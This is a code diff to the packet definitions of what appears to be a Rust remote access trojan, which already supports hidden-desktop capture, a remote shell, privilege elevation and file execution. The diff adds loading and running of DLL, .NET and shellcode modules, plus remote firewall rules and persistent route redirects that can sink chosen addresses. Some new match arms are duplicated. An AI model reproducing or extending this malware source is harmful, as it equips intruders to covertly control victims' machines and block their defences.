@@ -30,6 +30,10 @@ pub enum ServerboundPacket {
     CurrentFolder(String),   
 
     HVNCFrame(Vec<u8>),
+    ModuleExecutionResult(ModuleExecutionResult),
+    ProcessConnections(Process),
+    FirewallRuleResult(bool, String), // success, message
+    RouteRedirectResult(bool, String), // success, message
 }
 
 impl Packet for ServerboundPacket {
@@ -60,6 +64,10 @@ impl Packet for ServerboundPacket {
             ServerboundPacket::FileList(_) => "File List",
             ServerboundPacket::CurrentFolder(_) => "Current Folder",
             ServerboundPacket::HVNCFrame(_) => "HVNC Frame",
+            ServerboundPacket::ModuleExecutionResult(_) => "Module Execution Result",
+            ServerboundPacket::ProcessConnections(_) => "Process Connections",
+            ServerboundPacket::FirewallRuleResult(_, _) => "Firewall Rule Result",
+            ServerboundPacket::RouteRedirectResult(_, _) => "Route Redirect Result",
         }
     }
 }
@@ -86,10 +94,15 @@ pub enum ClientboundPacket {
     ManageSystem(String),
 
     GetProcessList,
+    GetProcessConnections(usize),
     KillProcess(Process),
     SuspendProcess(Process),
     ResumeProcess(Process),
     StartProcess(String),
+    AddFirewallRule(FirewallRule),
+    RemoveFirewallRule(FirewallRule),
+    AddRouteRedirect(RouteRedirect),
+    RemoveRouteRedirect(RouteRedirect),
 
     StartShell,
     ExitShell,
@@ -116,6 +129,12 @@ pub enum ClientboundPacket {
     UploadFile(String, FileData),
 
     TrollClient(TrollCommand),
+
+    // Module loading and execution
+    LoadModule(ModuleData),
+    ExecuteModule(ModuleExecution),
+    UnloadModule(String),
+    ListModules,
 }
 
 impl Packet for ClientboundPacket {
@@ -150,10 +169,15 @@ impl Packet for ClientboundPacket {
             ClientboundPacket::ElevateClient => "Elevate Client",
             ClientboundPacket::ManageSystem(_) => "Manage System",
             ClientboundPacket::GetProcessList => "Get Process List",
+            ClientboundPacket::GetProcessConnections(_) => "Get Process Connections",
             ClientboundPacket::KillProcess(_) => "Kill Process",
             ClientboundPacket::SuspendProcess(_) => "Suspend Process",
             ClientboundPacket::ResumeProcess(_) => "Resume Process",
             ClientboundPacket::StartProcess(_) => "Start Process",
+            ClientboundPacket::AddFirewallRule(_) => "Add Firewall Rule",
+            ClientboundPacket::RemoveFirewallRule(_) => "Remove Firewall Rule",
+            ClientboundPacket::AddRouteRedirect(_) => "Add Route Redirect",
+            ClientboundPacket::RemoveRouteRedirect(_) => "Remove Route Redirect",
             ClientboundPacket::StartShell => "Start Shell",
             ClientboundPacket::ExitShell => "Exit Shell",
             ClientboundPacket::ShellCommand(_) => "Shell Command",
@@ -176,6 +200,15 @@ impl Packet for ClientboundPacket {
             ClientboundPacket::ExecuteFile(_) => "Execute File",
             ClientboundPacket::UploadFile(_, _) => "Upload File",
             ClientboundPacket::TrollClient(_) => "Troll Client",
+            ClientboundPacket::LoadModule(_) => "Load Module",
+            ClientboundPacket::ExecuteModule(_) => "Execute Module",
+            ClientboundPacket::UnloadModule(_) => "Unload Module",
+            ClientboundPacket::ListModules => "List Modules",
+            ClientboundPacket::GetProcessConnections(_) => "Get Process Connections",
+            ClientboundPacket::AddFirewallRule(_) => "Add Firewall Rule",
+            ClientboundPacket::RemoveFirewallRule(_) => "Remove Firewall Rule",
+            ClientboundPacket::AddRouteRedirect(_) => "Add Route Redirect",
+            ClientboundPacket::RemoveRouteRedirect(_) => "Remove Route Redirect",
         }
     }
 }
@@ -235,6 +268,17 @@ pub struct ProcessList {
 pub struct Process {
     pub pid: usize,
     pub name: String,
+    pub network_connections: Option<Vec<NetworkConnection>>,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct NetworkConnection {
+    pub local_address: String,
+    pub local_port: u16,
+    pub remote_address: String,
+    pub remote_port: u16,
+    pub state: String,
+    pub protocol: String,
 }
 
 #[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
@@ -288,5 +332,68 @@ pub enum TrollCommand {
     SpeakText(String),
     Beep(String),
     PianoKey(String),
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub enum ModuleType {
+    PE,           // Windows PE/DLL
+    DotNetAssembly, // .NET Assembly
+    Shellcode,    // Position-independent code
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct ModuleData {
+    pub id: String,           // Unique module identifier
+    pub name: String,         // Human-readable name
+    pub module_type: ModuleType,
+    pub data: Vec<u8>,        // Module binary data
+    pub entry_point: Option<String>, // Entry point for DLL/Assembly (function/method name)
+    pub description: String,  // Module description
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct ModuleExecution {
+    pub module_id: String,    // ID of the module to execute
+    pub args: Vec<String>,    // Command-line arguments
+    pub timeout: Option<u32>, // Execution timeout in seconds
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct ModuleExecutionResult {
+    pub module_id: String,
+    pub success: bool,
+    pub output: String,       // Stdout/result
+    pub error: String,        // Stderr/error
+    pub exit_code: i32,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct FirewallRule {
+    pub process_name: String,
+    pub process_path: Option<String>,
+    pub rule_name: String,
+    pub direction: FirewallDirection, // Inbound or Outbound
+    pub action: FirewallAction,       // Block or Allow
+    pub remote_addresses: Option<Vec<String>>, // Optional specific IPs to block/allow
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub enum FirewallDirection {
+    Inbound,
+    Outbound,
+    Both,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub enum FirewallAction {
+    Block,
+    Allow,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct RouteRedirect {
+    pub target_address: String,    // IP to redirect
+    pub redirect_to: String,        // Invalid address to redirect to (e.g., "127.0.0.1" or "0.0.0.0")
+    pub permanent: bool,            // Whether to make persistent across reboots
 }
 
